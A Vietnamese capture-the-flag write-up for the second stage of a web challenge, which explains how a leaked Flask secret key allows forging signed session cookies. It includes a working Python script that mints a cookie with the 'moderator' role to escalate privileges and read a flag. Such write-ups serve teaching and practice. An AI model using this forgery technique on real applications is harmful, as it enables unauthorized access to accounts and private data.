![image](https://github.com/user-attachments/assets/f1ade6e6-4721-44e0-85c0-3fdd8bc403fa)

# **ANALYZE**

Đến với Stage 2 , mang theo  `FLASK_APP_SECRET_KEY` mà ta nhận được từ STAGE_1

Ta sẽ đi đọc trong source code để tìm manh mối về `STAGE_2` và `FLASK_APP_SECRET_KEY`

Thông tin đầu tiên mà ta có được là : Flag được nằm trong 1 bài note chỉ có admin hoặc mod mới có thể xem được .

```
await page.type('textarea[name="content"]', `Here you got some juicy flag: ${FLAG_STAGE_2}`);
```

```
@app.route('/dashboard')
@login_required
def dashboard():
    if is_mod():
        return redirect(url_for('moderator'))

    user_notes = [(nid, notes[nid]['title'], notes[nid]['content']) for nid in notes if notes[nid]['owner'] == g.user]
```

Trong main.py, đoạn mã sau cho thấy Flask lưu session thông qua session['user']:
```
session['user'] = {
    'username': username,
    'role': 'admin' if hashlib.sha512(password.encode()).hexdigest() == ADMIN_PASSWORD_HASH else 'user'
}
```

→ Tức là sau khi đăng nhập, Flask sẽ lưu nội dung session dưới dạng:

```
{
  "user": {
    "username": "tên bạn nhập",
    "role": "user" hoặc "admin"
  }
}
```
Flask sẽ tự động serialize, sign và mã hóa thông tin này thành cookie tên là session.

Flask dùng thư viện itsdangerous kết hợp với secret key:

```
app.secret_key = os.environ.get("FLASK_APP_SECRET_KEY")
```

→ Mỗi session cookie sẽ được Flask ký bằng FLASK_APP_SECRET_KEY.


Và ta đã có đã có FLASK_APP_SECRET_KEY từ .env (Stage 1), ta hoàn toàn có thể tạo cookie có role "moderator" hoặc "admin".


Thông qua hành vi xử lý quyền:

```
def is_mod():
    return g.user.get('role') in ['admin', 'moderator']
```
  
→ Chỉ cần trong session có user.role = "moderator" là đủ để:

Vượt qua @moderator_required

Truy cập /report/<note_id>, /moderator


# **EXPLOIT**

Cuối cùng thì script để làm giả cookie sẽ là : 

```
from flask.sessions import SecureCookieSessionInterface
from flask import Flask

# B1: Setup Flask giả để dùng serializer giống thật
app = Flask(__name__)
app.secret_key = "9f310d75c84c1aba65fa87fec8980f7c43b55dd274b41e3512777981ca37ea1d606e626c24248a0d39957c2bb94c9493f410"

# B2: Lấy công cụ ký
class SimpleSecureCookie(SecureCookieSessionInterface):
    def get_signing_serializer(self, app):
        return super().get_signing_serializer(app)

serializer = SimpleSecureCookie().get_signing_serializer(app)

# B3: Tạo nội dung session giả
cookie = serializer.dumps({
    "user": {
        "username": "canheeu",
        "role": "moderator"
    }
})

print("Final signed cookie:", cookie)
```

Sau khi đổi cookie thì ta đã hoàn toàn leo thang lên được quyền mod 

![image](https://github.com/user-attachments/assets/6b6624e3-c57e-4cb2-a2f8-3b9c911d4ba8)








